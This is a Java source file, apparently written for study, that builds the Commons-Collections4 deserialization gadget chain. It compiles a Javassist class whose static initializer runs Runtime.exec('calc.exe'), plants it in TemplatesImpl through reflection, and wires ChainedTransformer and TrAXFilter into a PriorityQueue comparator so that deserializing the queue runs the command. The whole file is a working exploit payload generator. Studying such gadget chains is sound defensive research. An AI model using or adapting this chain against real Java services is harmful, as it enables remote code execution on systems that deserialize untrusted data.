package gadget;

import util.ReflectionUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC4Test {
    public static void main(String[] args) throws Exception {
        //使用Javassit新建一个含有static的类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Squirt1e");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};

        //补充实例化新建类所需的条件
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");

        Transformer[] trans = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates})
        };
        ChainedTransformer chian = new ChainedTransformer(trans);
        TransformingComparator transCom = new TransformingComparator(chian);
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);
        Field com = PriorityQueue.class.getDeclaredField("comparator");
        com.setAccessible(true);
        com.set(queue,transCom);

//        serialize(queue);
        unserialize();
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CC4.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CC4.bin"));
        objectInputStream.readObject();
    }
}
